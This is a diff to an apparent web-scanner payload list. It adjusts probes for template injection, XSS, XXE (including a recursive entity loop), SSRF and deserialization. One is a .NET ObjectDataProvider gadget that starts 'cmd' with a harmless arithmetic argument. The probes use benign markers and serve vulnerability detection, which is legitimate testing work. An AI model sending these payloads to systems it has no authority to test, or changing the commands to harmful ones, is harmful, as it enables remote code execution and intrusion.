@@ -119,8 +119,6 @@ ${"invalid"?no_such_builtin}
 {{> invalid_partial}}
 ##Smarty (PHP) - Error##
 {invalid_function()}
-##Blade (PHP/Laravel) - Error##
-{{$undefined->method()}}
 ##ERB (Ruby) - Error##
 <%=invalid%>
 <%=raise 'ssti_error'%>
@@ -204,11 +202,9 @@ new GroovyShell().evaluate('invalid syntax {{{}}}')
 ##XSS - Error (data URI)##
 <a href="data:text/html,<script>alert(1337)</script>">click</a>
 ##XXE - Error-Based##
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "1337">]><root>&xxe;</root>
-<foo>1337</foo>
-<![CDATA[1337]]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM>]><root/>
 ##XXE - Error (recursive entity)##
-<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "1337">]><foo>&a;</foo>
+<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "&#x26;a;">]><foo>&a;</foo>
 ##SSRF - Error-Based##
 http://[invalid
 http://
@@ -338,7 +334,7 @@ a:1:{i:0;O:23:"UndefinedClassName1337":0:{}}
 ##Node js-yaml - Error (bad regexp)##
 !!js/regexp /[invalid/
 ##Node funcster - Error (invalid code)##
-{"__js":"throw new Error(1337)"}
+{"fn":{"__js_function":"function(){return 7*191}"}}
 ##Node cryo - Error (proto pollution)##
 {"__proto__":{"__cryo__":{"reduce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}}}
 ##Ruby YAML - Error (invalid class)##
@@ -418,7 +414,7 @@ __VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
 ##.NET ViewState - Error (generator)##
 __VIEWSTATEGENERATOR=CA0B0334
 ##.NET JavaScriptSerializer - Error (ObjectDataProvider)##
-{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
 ##.NET LosFormatter - Error (truncated)##
 /wEAAQAAAP////8BAAAAAAAAAA==
 ##.NET ObjectStateFormatter - Error (probe)##
